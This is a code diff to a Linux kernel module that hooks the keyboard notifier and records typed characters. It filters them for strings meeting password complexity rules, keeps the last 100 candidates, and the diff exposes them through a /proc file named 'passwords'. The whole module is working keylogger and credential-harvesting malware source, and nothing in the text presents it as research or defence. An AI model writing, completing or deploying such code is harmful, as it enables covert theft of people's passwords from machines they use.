@@ -1,9 +1,4 @@
 /* What we need to do:
- * 	1. The recorded keycode isn't 1:1 on the letter typed. Only record
- * 	   on the typed letter.
- * 	2. Record the last 15 characters ACTUALLY typed to the screen and
- * 	   check if it meets password rules:
- * 	   (3 of the 4: lowercase letters, uppercase letters, symbols, numbers)
  * 	3. Save a password that fits #2 in a proc file called "passwords". Save
  * 	   The last 100 potential paswords. We can use a linked list type data
  * 	   structure or just allocate a ton of space in a list of char*, probably
@@ -136,8 +131,24 @@ void check_pw(char* pw, int len){
 }
 
 
-ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
-	return 0;
+ssize_t read_password(struct file *filp, char *buf, size_t count, loff_t *offp ) {
+	int i;
+	size_t comp = 0;
+	if(HEAD == NULL){
+		return 0;
+	}
+	struct password* curr = HEAD;
+	i = 0;
+       	for(; i<100; i++){
+		comp += snprintf(buf + comp, count - comp, "%s\n", curr->pw);
+		if(!curr->next){ // Read the last one
+			break;
+		}
+		curr = curr->next;
+	}
+
+	*offp = comp;
+	return comp;
 }
 
 struct proc_ops proc_fops = {
@@ -149,23 +160,20 @@ char pw_buffer[16];
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
 	int len;
 	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
-	//printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
-
 	
 	if(kp->value > 57 || kp->value == 54 || kp->value == 42 || kp->value == 14) return 0; // The shifts and back space
 
 	if(kp->down){
 		len = strlen(pw_buffer);
 		//printk("length of the buffer: %d\n", len);
-		if(len == 15 || kp->value == 57 || kp->value == 28){ // reset it on a space and newline as well
+		if(len == 15 || kp->value == 57 || kp->value == 28 || kp->value == 15){ // reset it on a space and newline as well
 			check_pw(pw_buffer, len);
 			CLEAR_BUFFER(pw_buffer, len);
-			if(kp->value == 57 || kp->value == 28) return 0; // return if it is a space
+			if(kp->value == 57 || kp->value == 28 || kp->value == 15) return 0; // return if it's a non character
+			len = 0; // We have a new password entry from here
 		}
 		pw_buffer[len] = *keymap[kp->value][kp->shift];
 	}
-	//printk("Letter: %s\n", keymap[kp->value][kp->shift]);
-	//printk("Number of passwords: %d\n", password_count);
 
 	return 0;
 }
@@ -175,14 +183,14 @@ int init (void) {
 	
 	nb.notifier_call = kb_notifier_fn;
 	register_keyboard_notifier(&nb);
-	// proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
+	proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
 	return 0;
 }
 
 void cleanup(void) {
 	unregister_keyboard_notifier(&nb);
 	ll_destructor(&HEAD);
-	// remove_proc_entry(PROC_FILE_NAME,NULL);
+	remove_proc_entry(PROC_FILE_NAME,NULL);
 }
 
 MODULE_LICENSE("GPL"); 
